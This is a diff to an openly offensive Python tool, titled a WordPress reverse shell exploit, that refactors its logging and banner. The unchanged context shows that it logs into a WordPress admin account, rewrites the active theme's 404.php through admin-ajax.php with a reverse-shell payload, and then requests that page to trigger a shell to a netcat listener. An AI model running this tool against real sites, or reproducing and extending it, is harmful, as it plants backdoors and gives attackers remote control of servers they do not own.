@@ -24,14 +24,15 @@
 #                                                                              #
 ################################################################################
 
-from time import sleep
+from time import sleep, strftime
 from os import system
 import threading
 import requests
 import re
 
-from pwn import log
+from termcolor import colored
 import argparse
+
 
 # General constants
 SESSION = requests.Session()
@@ -161,22 +162,42 @@ function printit ($string) {
 """
 
 
+
+def abstract_log(text: str, color: str, log_text:str, important: bool = False, date_color: str = "light_blue"):
+    attrs = []
+    lb = colored("[", "white")
+    rb = colored("]", "white")
+    print(lb + colored(strftime("%H:%M:%S"), date_color) + rb, end=" ")
+    print(lb, end="")
+    if(important):
+        attrs = ["bold"]
+    print(colored(log_text, color, attrs=attrs) + colored("] ", "white") + colored(text, "white", attrs=attrs))
+
+
+def info(text: str, important: bool = False):
+    abstract_log(text=text, color="light_green", log_text="INFO", important=important)
+
+def warning(text: str, important: bool = False):
+    abstract_log(text=text, color="yellow", log_text="WARNING", important=important)
+
+def error(text: str):
+    abstract_log(text=text, color="red", log_text="ERROR", important=True)
+
+def critical(text: str):
+    abstract_log(text=text, color="red", log_text="CRITICAL", important=True)
+
+
 def banner():
     """
-        Display the script banner
+    Display the script banner
     """
-    print("""\x1b[33m
- __      ____________      .__     
-/  \\    /  \\______   \\_____|  |__  
-\\   \\/\\/   /|     ___/  ___/  |  \\ 
- \\        / |    |   \\___ \\|   Y  \\
-  \\__/\\  /  |____|  /____  >___|  /
-       \\/                \\/     \\/              
-\x1b[0m   \x1b[1m\x1b[33m   
-=[ WordPress reverse shell exploit 
-=[ NullBrunk
-\x1b[0m
-""")
+    print(
+        colored(f"""\n               _  \n""", "yellow", attrs=["bold"]) +
+        colored(f""" _ _ _ ___ ___| |_ \n""", "yellow", attrs=["bold"]) +
+        colored(f"""| | | | . |_ -| , |""", "yellow", attrs=["bold"]) + colored("    WordPress Reverse Shell Exploit\n", "white") +
+        colored(f"""|_,_,_|  _|___|_|_|""", "yellow", attrs=["bold"]) + colored("    (", "white") + colored("@NullBrunk", "red") + colored(")\n", "white") +
+        colored(f"""      |_|\n""", "yellow", attrs=["bold"])
+    ) 
 
 
 def parse_args() -> tuple:
@@ -195,8 +216,7 @@ def parse_args() -> tuple:
     args = parser.parse_args()
 
     if(not args.u.startswith("http")):
-        log.error("Missing schema (http:// | https://)")
-        log.info("Adding http:// ...")
+        warning("unspesified schema using default one (http://)")
         args.u = "http://" + args.u
 
     if(not args.u.endswith("/")):
@@ -214,7 +234,6 @@ def extract_value(input: str) -> str:
     """
         Extract the value from the input's value attribute
     """
-
     return input.split("value=")[1].split('"')[1]
 
 
@@ -223,19 +242,21 @@ def authenticate(target :str, wp_user: str, wp_pass: str) -> None:
     Attempt to authenticate with the given credentials
     """
 
-    log.info(f"Attempting to authenticate")
-
-    SESSION.post(f"{target}wp-login.php", data = {
+    admin_url = SESSION.get(f"{target}wp-admin/", allow_redirects=True).url
+    info(f"found wp-admin login page", True)
+    info("attempting to authenticate")
+    
+    SESSION.post(admin_url, data = {
         "log": wp_user,
         "pwd": wp_pass,
         "wp-submit": "Submit"
     })
 
     if(len(SESSION.cookies) <= 1):
-        log.critical("Failed to authenticate")
+        critical("failed to authenticate")
         exit()
     
-    log.success(f"Authentication succeeded")
+    info(f"authentication succeeded", True)
 
 
 def get_edition_page(target) -> str:
@@ -247,11 +268,11 @@ def get_edition_page(target) -> str:
     try:
         unparsed_url = re.findall(".*404.php.*", pages_url)[0]
     except IndexError:
-        log.critical("404.php not found")
+        critical("404.php not found")
         exit()
     
     editable = unparsed_url.split('"')[1]
-    log.success("Found 404.php at /" + editable.replace(target, ""))
+    info("found 404.php at " + editable, True)
 
     return editable
 
@@ -279,9 +300,9 @@ def upload_reverse_shell(target: str, link: str) -> None:
         "docs-list": "",
     }
     if(not '"success":true' in SESSION.post(f"{target}wp-admin/admin-ajax.php", data=data).text):
-        log.critical("Could not edit the 404.php page")
+        critical("could not edit the 404.php page")
         exit()
-    log.success(f"Successfully uploaded the reverse shell")
+    info(f"successfully uploaded the reverse shell", True)
 
 
 def trigger_backdoor(target: str):
@@ -289,14 +310,14 @@ def trigger_backdoor(target: str):
         Trigger the reverse shell by sending a GET request to the 404.php page
     """
     
-    log.info("Triggering the reverse shell ...")
+    warning("attempting to trigger the reverse shell")
 
     # Wait for the netcat listener to start listening
     sleep(1)
 
     # Trigger the reverse shell
     trigger_url = f"{target}wp-content/themes/{THEME}/{TRIGGER_PAGE}"
-    log.info("GET " + trigger_url + "\n\n")
+    info("GET " + trigger_url + "\n")
     SESSION.get(trigger_url)
 
 
@@ -324,4 +345,10 @@ if __name__ == "__main__":
     banner()
 
     target, wp_user, wp_pass = parse_args()
-    main(target, wp_user, wp_pass)
+    try:
+        main(target, wp_user, wp_pass)
+    except:
+        error("user exit")
+        
+    print()
+    error("user exit")
